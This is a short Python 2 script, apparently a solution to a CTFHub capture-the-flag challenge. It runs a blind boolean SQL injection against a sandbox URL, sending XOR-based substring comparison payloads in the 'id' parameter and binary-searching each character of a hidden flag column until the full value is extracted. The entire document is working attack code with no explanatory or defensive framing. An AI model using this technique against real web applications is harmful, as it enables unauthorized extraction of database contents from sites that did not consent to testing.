#! python2
import requests as re
name=""
chk=0
url='http://challenge-04d48a5adcf7b5ea.sandbox.ctfhub.com:10080/?id='
for i in xrange(1,100):
	left=33
	right=126
	while right-left!=1:
		mid=(left+right)/2
		payload="0^(substr((select+binary+flag+from+sqli.`flag`),{i},1)>binary+{mid})%23".format(i=i,mid=hex(mid))
		if 'query_success' in re.get(url+payload).text:
			left=mid
		else:
			right=mid
	if right==34:
	 	break
	name+=chr(right)
print name